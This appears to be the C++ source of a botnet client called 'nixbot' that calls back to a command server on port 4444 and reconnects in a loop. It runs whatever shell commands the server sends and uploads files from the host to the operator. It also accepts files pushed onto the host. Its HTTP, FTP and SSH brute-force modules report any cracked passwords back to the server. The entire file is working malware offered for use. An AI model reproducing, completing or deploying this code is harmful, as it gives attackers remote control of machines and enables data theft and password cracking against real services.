#include <string.h>
#include <iostream>
#include <errno.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <thread>
#include <sys/stat.h>
#include <fstream>
#include <vector>

#include "includes/execute.h"
#include "../includes/file_send.h"
#include "includes/http_bruteforce.h"
#include "includes/ftp_bruteforce.h"
#include "includes/ssh_bruteforce.h"

struct file_manager {
	std::string file_location;
	unsigned long current_size = 0;
	unsigned long full_size;
} file_manager_struct;

struct bruteforcer_info {
    char *info[5] = {nullptr};
} bruteforcer_info_struct;

std::vector<std::string> stored_messages;

void message_handler(char *, int *);
void load_bruteforcer_info(char **, int);
int send_data(char *, int);
int recv_data(char *, int, int);
void cleanup();

int *hsock;

int main() {
    while (true) {
        hsock = new int;

        int host_port = 4444;
		char host_name[] = "127.0.0.1";

		struct sockaddr_in my_addr;

		//creating new socket
		*hsock = socket(AF_INET, SOCK_STREAM, 0); //0 so that the system will chose the TCP Protocol for socket type SOCK_STREAM
		if(*hsock == -1) {
 		    std::cout << "Error initializing socket " << errno << std::endl;
 		    cleanup();
		    continue;
		}

		int *p_int = new int;
		*p_int = 1; //option enabled
		if((setsockopt(*hsock, SOL_SOCKET, SO_REUSEADDR, (char*)p_int, sizeof(int)) == -1) || (setsockopt(*hsock, SOL_SOCKET, SO_KEEPALIVE, (char*)p_int, sizeof(int)) == -1 )) {
		    std::cout << "Error setting options " << errno << std::endl;
		    delete p_int;
		    cleanup();
		    continue;
		}
		delete p_int;

		my_addr.sin_family = AF_INET ;
		my_addr.sin_port = htons(host_port);
		bzero(&(my_addr.sin_zero), 8); //not used, must be zero
		my_addr.sin_addr.s_addr = inet_addr(host_name);

		if(connect(*hsock, (struct sockaddr*)&my_addr, sizeof(my_addr)) == -1) {
		    if(errno != EINPROGRESS) {
		        std::cout << "Error connecting socket " << errno << std::endl;
		        cleanup();
		        sleep(1);
		        continue;
		    }
		}

        //send stored messages if any
        for (int i = 0; i < stored_messages.size(); i++) {
            if (send_data((char *)stored_messages[0].c_str(), stored_messages[0].size() + 1))
                break;
            stored_messages.erase(stored_messages.begin(), stored_messages.begin() + 1);
        }

		while (hsock != nullptr) {
            int bytes_received;
            char incoming_buffer[5002]; //received (4095 + 7 extra characters for nixbot_)

			if ((bytes_received = recv_data(&incoming_buffer[0], 4095, 0)) == 0)
		        break; //get outa here; shit fucked up
            memcpy(&incoming_buffer[bytes_received], (char*)"nixbot_", 7);

            char delimiter[] = "\0nixbot_"; //our delimiter

            for (int i = 0, j = 0; i < bytes_received; i++) {
                if (memcmp(&incoming_buffer[i], &delimiter[0], 8) == 0) { //we got a part
                    int *part_size = new int;
                    *part_size = i - j + 1;
                    char *part = new char[*part_size]; //allocate space for this command
                    memcpy(part, &incoming_buffer[j], *part_size);

                    std::thread start(message_handler, part, part_size);
                    start.detach();

                    j = i + 1;
                }
            }
		}
    }
}

void message_handler(char *incoming_buffer, int *bytes_received) {
	std::cout << "Here: " << incoming_buffer << std::endl;

    if (strcmp(incoming_buffer, "nixbot_ping::") == 0) { //do nothing in this one
        goto leave_it;
    } else if(strcmp(incoming_buffer, "nixbot_get_info::") == 0) {
        delete bytes_received;
		delete[] incoming_buffer;

		char output[1024];

        char user[100];
        getlogin_r(user, 99);

        char current_dir[256];
        getcwd(current_dir, 255);

        sprintf(output, "nixbot_get_info::%s::%s", user, current_dir);

        send_data(&output[0], strlen(output) + 1);

		return;
	} else if (strncmp(incoming_buffer, "download", 8) == 0) { //download a file on the server
		struct stat statbuf;
		if (stat(&incoming_buffer[9], &statbuf) == -1)
            goto leave_it;

		char download_message[40]; //17 digits for the size, so the supported size can be considered infinite
		sprintf(download_message, "nixbot_download_size::%ld", (long)statbuf.st_size);
		if (send_data(&download_message[0], strlen(download_message) + 1) == 0)//send the size to the server
        	goto leave_it;

		file_send file_send_class(&incoming_buffer[9], (long)statbuf.st_size, &hsock);
		file_send_class.upload_file();

		goto leave_it;
    } else if (strncmp(incoming_buffer, "nixbot_file_location::", 22) == 0) {
        incoming_buffer += 22;

        std::cout << incoming_buffer << std::endl;

        for (int i = 0; i < strlen(incoming_buffer); i++) {
            if (strncmp(&incoming_buffer[i], "::", 2) == 0) {
                incoming_buffer[i] = '\0';

                file_manager_struct.file_location = incoming_buffer;

                incoming_buffer += i + 2;
                file_manager_struct.full_size = atol(incoming_buffer);
                std::cout << file_manager_struct.full_size << std::endl;
                incoming_buffer -= (i + 2);
            }
        }

        //remove the file if it already exists
        std::ifstream test(file_manager_struct.file_location.c_str());
        if (test.good()) {
            test.close();
            unlink(file_manager_struct.file_location.c_str()); //remove the old bitch bcz no1 carz
        } else
            test.close();

        incoming_buffer -= 22;
        goto leave_it;
    } else if (strncmp(incoming_buffer, "nixbot_file_bytes::", 19) == 0) {
		std::ofstream output(file_manager_struct.file_location.c_str(), std::ios::binary | std::ios::app);
        if (output.is_open()) {
            output.write(&incoming_buffer[19], *bytes_received - 20); //+1 for the \0
            file_manager_struct.current_size += *bytes_received - 20;
        } //Not gonna bother with an "else" (unwritable directory or binary already exists and is unwritable); the user should deal with this dumb problem of his
        output.close();

        if (file_manager_struct.current_size == file_manager_struct.full_size) {
            std::cout << "File Received" << std::endl;
            file_manager_struct.current_size = 0;
            send_data((char *)"nixbot_upload_complete::", 25);
        }

		goto leave_it;
    } else if (strncmp(incoming_buffer, "nixbot_httpbruteforce::", 23) == 0) {
        incoming_buffer += 23;

        load_bruteforcer_info(&incoming_buffer, 5);
        send_data((char *)"nixbot_pass::S", 15); //SEND MEH DE PASSWADS!

        incoming_buffer -= (*bytes_received - 1); //-1 because there's an extra \0 at the end of the message
        goto leave_it;
    } else if (strncmp(incoming_buffer, "nixbot_ftpbruteforce::", 22) == 0) {
        incoming_buffer += 22;

        load_bruteforcer_info(&incoming_buffer, 2);
        send_data((char *)"nixbot_pass::S", 15);

        incoming_buffer -= (*bytes_received - 1); //-1 because there's an extra \0 at the end of the message
        goto leave_it;
    }  else if (strncmp(incoming_buffer, "nixbot_sshbruteforce::", 22) == 0) {
        incoming_buffer += 22;

        load_bruteforcer_info(&incoming_buffer, 3);
        send_data((char *)"nixbot_pass::S", 15);

        incoming_buffer -= (*bytes_received - 1); //-1 because there's an extra \0 at the end of the message
        goto leave_it;
    } else if (strncmp(incoming_buffer, "nixbot_httppasswords::", 22) == 0) {
        incoming_buffer += 22;

        http_bruteforce http_bruteforce_class(bruteforcer_info_struct.info); //allocate memory

        char *end_address = incoming_buffer + *bytes_received - 22;
        while (incoming_buffer != end_address) {
            http_bruteforce_class.passwords.push_back(incoming_buffer); //add the passwords
            incoming_buffer += strlen(incoming_buffer) + 1;
        }

        std::string found_password = http_bruteforce_class.bruteforce(); //all of this is already running in another thread (line 85)
        char *found_it;
        if (found_password.size() == 0) {
            found_it = new char[15]; //15 for "nixbot_pass::S" + \0
            sprintf(found_it, "nixbot_pass::S");
        } else {
            found_it = new char[29 + found_password.size()]; //29 for "nixbot_pass::HTTP Password: " + \0
            sprintf(found_it, "nixbot_pass::HTTP Password: %s", found_password.c_str());
        }

        if (send_data(found_it, strlen(found_it) + 1) == 0)
            stored_messages.push_back(found_it); //we store the password incase the server was down so that we can send it later
        delete[] found_it;

        incoming_buffer -= *bytes_received;
        goto leave_it;
	} else if (strncmp(incoming_buffer, "nixbot_ftppasswords::", 21) == 0) {
        incoming_buffer += 21;

        ftp_bruteforce ftp_bruteforce_class(bruteforcer_info_struct.info); //allocate memory

        char *end_address = incoming_buffer + *bytes_received - 21;
        while (incoming_buffer != end_address) {
            ftp_bruteforce_class.passwords.push_back(incoming_buffer); //add the passwords
            incoming_buffer += strlen(incoming_buffer) + 1;
        }

        std::string found_password = ftp_bruteforce_class.bruteforce(); //all of this is already running in another thread (line 85)
        char *found_it;
        if (found_password.size() == 0) {
            found_it = new char[15]; //15 for "nixbot_pass::S" + \0
            sprintf(found_it, "nixbot_pass::S");
        } else {
            found_it = new char[28 + found_password.size()]; //28 for "nixbot_pass::FTP Password: " + \0
            sprintf(found_it, "nixbot_pass::FTP Password: %s", found_password.c_str());
        }

        if (send_data(found_it, strlen(found_it) + 1) == 0)
            stored_messages.push_back(found_it); //we store the password incase the server was down so that we can send it later
        delete[] found_it;

        incoming_buffer -= *bytes_received;
        goto leave_it;
	} else if (strncmp(incoming_buffer, "nixbot_sshpasswords::", 21) == 0) {
        incoming_buffer += 21;

        ssh_bruteforce ssh_bruteforce_class(bruteforcer_info_struct.info); //allocate memory

        char *end_address = incoming_buffer + *bytes_received - 21;
        while (incoming_buffer != end_address) {
            ssh_bruteforce_class.passwords.push_back(incoming_buffer); //add the passwords
            incoming_buffer += strlen(incoming_buffer) + 1;
        }

        std::string found_password = ssh_bruteforce_class.bruteforce(); //all of this is already running in another thread (line 85)
        char *found_it;
        if (found_password.size() == 0) {
            found_it = new char[15]; //15 for "nixbot_pass::S" + \0
            sprintf(found_it, "nixbot_pass::S");
        } else {
            found_it = new char[28 + found_password.size()]; //28 for "nixbot_pass::SSH Password: " + \0
            sprintf(found_it, "nixbot_pass::SSH Password: %s", found_password.c_str());
        }

        if (send_data(found_it, strlen(found_it) + 1) == 0)
            stored_messages.push_back(found_it); //we store the password incase the server was down so that we can send it later
        delete[] found_it;

        incoming_buffer -= *bytes_received;
        goto leave_it;
	} else {
		std::string buffer_string = incoming_buffer; //time to use find because why the fuck not.
		delete[] incoming_buffer; //we don't need this anymore
		delete bytes_received;
		buffer_string.append(";"); //we gonna need this

		size_t found;
		while ((found = buffer_string.find(";")) != std::string::npos) {
			//I know that some may think that there is no point of using this new command variable
			//but we have to store the value outputed by substr since we're going to use it multiple times
			//so we're after less cpu operations and more memory usage for this one
			char *command = (char *)buffer_string.substr(0, found).c_str();
			std::cout << "COMMAND: " << command << std::endl;

			//now we can go for this part or stick with 'command' if we want to save some memory but this will also require
			//a lot of operations to get the initial value of 'command' after we 'strtok' it.
			char *command_copy = new char[strlen(command) + 1];
			strcpy(command_copy, command);

			char *pch = strtok(command, " ");
			if (pch != NULL) {
				if (strcmp(pch, "cd") == 0) {
					delete[] command_copy;

					pch = strtok(NULL, " ");
					if (pch != NULL) {
						std::cout << "Changing directory to: " << pch << std::endl;

						if (chdir(pch) == 0) {
							char *current_dir = new char[274];
							strcpy(current_dir, "nixbot_new_path::");
			    			getcwd(&current_dir[17], 256);

							if (send_data(current_dir, strlen(current_dir) + 1) == 0) {
								delete[] current_dir;
        						return;
			                }

							delete[] current_dir;
						} else {
							char nixbot_error[38]; //3 digits for errno + \0
			                sprintf(nixbot_error, "[ERROR] Error changing directory: %d", errno);
			                if (send_data(nixbot_error, strlen(nixbot_error) + 1) == 0)
        						return;
						}
					}
				} else {
					std::string output;
	                unsigned short function_return; //a short because we barely need 6 bits

					execute execute_class(command_copy, &output, &function_return);
					std::thread start(&execute::go_for_it, &execute_class);
					start.join();

					delete[] command_copy;

	                if (function_return != 0) {
	                    char nixbot_error[29]; //3 digits for errno + \0
	                    sprintf(nixbot_error, "[ERROR] Error executing: %d", function_return);
	                    if (send_data(nixbot_error, strlen(nixbot_error) + 1) == 0)
        					return;
	                } else if (output != "") {
						if (send_data((char *)output.c_str(), output.size() + 1) == 0)
        					return;
	                }
				}
			}
			buffer_string.erase(0, found + 1);
		}

		return; //we don't want to go to leave_it
    }

    leave_it:
    delete[] incoming_buffer;
    delete bytes_received;
    return;
}

void load_bruteforcer_info(char **incoming_buffer, int number) {
    for (int i = 0; i < 5; i++) {
        delete[] bruteforcer_info_struct.info[i];
        bruteforcer_info_struct.info[i] = nullptr; //that's a good practice
    }

    for (int i = 0, j = 0; j < number; i++) {
        if (strncmp(&incoming_buffer[0][i], "::", 2) == 0) {
            incoming_buffer[0][i] = '\0';

            bruteforcer_info_struct.info[j] = new char[strlen(*incoming_buffer) + 1];
            strcpy(bruteforcer_info_struct.info[j], *incoming_buffer);

            *incoming_buffer += i + 2; //move to the next part
            i = -1;

            j++;
        }
    }
}

int send_data(char *data, int size) {
    int bytecount = send(*hsock, data, size, 0);
    if(bytecount == -1) {
        std::cout << "Error sending data: " << errno << std::endl;
        cleanup();
        return 0;
    }

    return bytecount;
}

int recv_data(char *data, int size, int flags) {
    int bytecount;
    if((bytecount = recv(*hsock, data, size, flags)) == -1) {
        std::cout << "Error receiving data: " << errno << std::endl;
        cleanup();
        return 0;
    }

    data[bytecount] = '\0';
    return bytecount;
}

void cleanup() {
    shutdown(*hsock, 2);
    close(*hsock);
    delete hsock;
    hsock = nullptr;
}
